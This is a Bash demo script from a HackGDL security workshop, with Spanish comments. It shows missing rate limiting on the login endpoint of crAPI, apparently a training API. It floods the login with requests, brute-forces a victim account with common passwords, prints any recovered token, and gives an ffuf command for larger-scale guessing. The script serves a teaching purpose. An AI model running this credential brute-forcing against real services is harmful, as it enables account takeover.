#!/bin/bash
# ============================================================
# DEMO SCRIPT 03 — Sin Rate Limiting / Fuerza Bruta
# HackGDL: Exploit the Invisible
# OWASP API Security Top 10: #4 — Unrestricted Resource Consumption
# ============================================================

TARGET="${1:-http://crapi-web}"
VICTIM_EMAIL="${2:-victim@hackgdl.mx}"

echo "=============================================="
echo " FASE 3: SIN RATE LIMITING — FUERZA BRUTA"
echo " Target: $TARGET"
echo " OWASP API Top 10 #4: Unrestricted Resource Consumption"
echo "=============================================="
echo ""

# ── 3.1 Demostrar ausencia de rate limiting ──────────────────
echo "[*] Probando rate limiting en endpoint de login..."
echo "[*] Enviando 20 requests en rápida sucesión..."
echo ""

SUCCESS=0
BLOCKED=0

for i in $(seq 1 20); do
  HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST "${TARGET}/identity/api/auth/login" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"${VICTIM_EMAIL}\",\"password\":\"wrong_password_${i}\"}")

  if [ "$HTTP_CODE" = "429" ]; then
    echo "  [BLOQUEADO] Request $i → HTTP $HTTP_CODE (Rate Limited)"
    BLOCKED=$((BLOCKED + 1))
  elif [ "$HTTP_CODE" = "200" ]; then
    echo "  [ÉXITO] Request $i → HTTP $HTTP_CODE ← CREDENCIALES CORRECTAS"
    SUCCESS=$((SUCCESS + 1))
  else
    echo "  [LIBRE] Request $i → HTTP $HTTP_CODE (sin bloqueo)"
  fi
done

echo ""
echo "----------------------------------------------"
if [ "$BLOCKED" -eq 0 ]; then
  echo "[!] VULNERABLE: 0 requests bloqueados de 20 intentos"
  echo "[!] El API no implementa rate limiting en /login"
else
  echo "[*] Rate limiting activo: $BLOCKED de 20 requests bloqueados"
fi
echo "----------------------------------------------"
echo ""

# ── 3.2 Fuerza bruta con contraseñas comunes ────────────────
echo "[*] Iniciando fuerza bruta con contraseñas comunes..."
echo ""

# Lista corta de contraseñas comunes para demo (no usar en producción)
COMMON_PASSWORDS=(
  "password"
  "123456"
  "password123"
  "admin"
  "letmein"
  "qwerty"
  "Password1"
  "Password1@"
  "Welcome1"
  "Summer2024!"
)

for PASS in "${COMMON_PASSWORDS[@]}"; do
  RESPONSE=$(curl -s -X POST "${TARGET}/identity/api/auth/login" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"${VICTIM_EMAIL}\",\"password\":\"${PASS}\"}")

  TOKEN=$(echo "$RESPONSE" | jq -r '.token' 2>/dev/null)

  if [ -n "$TOKEN" ] && [ "$TOKEN" != "null" ]; then
    echo "[!!!] CREDENCIALES ENCONTRADAS:"
    echo "      Email: $VICTIM_EMAIL"
    echo "      Password: $PASS"
    echo "      Token: ${TOKEN:0:50}..."
    break
  else
    echo "  [-] $PASS → Incorrecto"
  fi
done

echo ""
echo "----------------------------------------------"
echo "[!] Sin rate limiting = fuerza bruta trivial"
echo "[!] En producción: usar ffuf/hydra para mayor velocidad"
echo "----------------------------------------------"
echo ""

# ── 3.3 Mostrar comando ffuf para escala ────────────────────
echo "[*] Para escala real, usar ffuf:"
echo ""
echo "  ffuf -u ${TARGET}/identity/api/auth/login \\"
echo "       -X POST \\"
echo "       -H 'Content-Type: application/json' \\"
echo "       -d '{\"email\":\"${VICTIM_EMAIL}\",\"password\":\"FUZZ\"}' \\"
echo "       -w /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt \\"
echo "       -mc 200 \\"
echo "       -t 50"
echo ""
echo "[✓] Siguiente: ./04-data-exposure.sh"
